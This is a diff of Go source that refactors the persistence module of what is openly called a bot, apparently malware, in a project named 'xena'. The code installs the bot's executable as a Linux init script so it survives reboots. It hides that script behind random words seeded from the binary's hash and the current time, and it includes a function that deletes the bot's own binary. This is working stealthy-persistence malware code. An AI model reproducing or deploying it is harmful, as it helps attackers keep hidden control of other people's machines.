@@ -1,20 +1,21 @@
-package main
+package modules
 
 import (
 	"os"
 	"time"
+	"xena/helpers"
 )
 
 // Hash value of the bot's binary.
-var selfHash string
+var SelfHash string
 
 // scriptNameBySelfHash generates a file name based on the bot's hash.
 func scriptNameBySelfHash() (string, error) {
-	return randomPopularWordBySeed(integersFromString(selfHash)+512) + "_" + randomPopularWordBySeed(integersFromString(selfHash)+1024), nil
+	return helpers.RandomPopularWordBySeed(helpers.IntegersFromString(SelfHash)+512) + "_" + helpers.RandomPopularWordBySeed(helpers.IntegersFromString(SelfHash)+1024), nil
 }
 
-// removeBinary deletes the bot's binary file.
-func removeBinary() error {
+// RemoveBinary deletes the bot's binary file.
+func RemoveBinary() error {
 	selfPath, err := os.Executable()
 	if err != nil {
 		return err
@@ -28,9 +29,9 @@ func removeBinary() error {
 	return nil
 }
 
-// checkIfPersisted returns true if it recognizes that the bot is already persistent within the environment.
-func checkIfPersisted() bool {
-	switch osDetails().Os {
+// CheckIfPersisted returns true if it recognizes that the bot is already persistent within the environment.
+func CheckIfPersisted() bool {
+	switch GetOsDetails().Os {
 	case "linux":
 		scriptName, err := scriptNameBySelfHash()
 		if err != nil {
@@ -49,9 +50,9 @@ func checkIfPersisted() bool {
 	return false
 }
 
-// persist returns true if the executable was persisted within the environment.
-func persist() error {
-	switch osDetails().Os {
+// Persist returns true if the executable was persisted within the environment.
+func Persist() error {
+	switch GetOsDetails().Os {
 	case "linux":
 		executablePath, err := os.Executable()
 		if err != nil {
@@ -63,23 +64,23 @@ func persist() error {
 
 		scriptContent := "#! /bin/sh"
 		scriptContent += "\n### BEGIN INIT INFO"
-		scriptContent += "\n# Provides:          " + randomPopularWord()
+		scriptContent += "\n# Provides:          " + helpers.RandomPopularWord()
 		scriptContent += "\n# Required-Start:    $local_fs"
 		scriptContent += "\n# Required-Stop:     $local_fs"
 		scriptContent += "\n# Default-Start:     2 3 4 5"
 		scriptContent += "\n# Default-Stop:"
 		scriptContent += "\n# Short-Description: "
-		scriptContent += randomPopularWordBySeed(currentTime) + " "
-		scriptContent += randomPopularWordBySeed(currentTime-2) + " "
-		scriptContent += randomPopularWordBySeed(currentTime-4) + " "
-		scriptContent += randomPopularWordBySeed(currentTime - 6)
+		scriptContent += helpers.RandomPopularWordBySeed(currentTime) + " "
+		scriptContent += helpers.RandomPopularWordBySeed(currentTime-2) + " "
+		scriptContent += helpers.RandomPopularWordBySeed(currentTime-4) + " "
+		scriptContent += helpers.RandomPopularWordBySeed(currentTime - 6)
 		scriptContent += "\n# Description:       "
-		scriptContent += randomPopularWordBySeed(currentTime-8) + " "
-		scriptContent += randomPopularWordBySeed(currentTime-16) + " "
-		scriptContent += randomPopularWordBySeed(currentTime-32) + " "
-		scriptContent += randomPopularWordBySeed(currentTime-64) + " "
-		scriptContent += randomPopularWordBySeed(currentTime-128) + " "
-		scriptContent += randomPopularWordBySeed(currentTime - 256)
+		scriptContent += helpers.RandomPopularWordBySeed(currentTime-8) + " "
+		scriptContent += helpers.RandomPopularWordBySeed(currentTime-16) + " "
+		scriptContent += helpers.RandomPopularWordBySeed(currentTime-32) + " "
+		scriptContent += helpers.RandomPopularWordBySeed(currentTime-64) + " "
+		scriptContent += helpers.RandomPopularWordBySeed(currentTime-128) + " "
+		scriptContent += helpers.RandomPopularWordBySeed(currentTime - 256)
 		scriptContent += "\n### END INIT INFO"
 		scriptContent += "\n\n../.." + executablePath
 
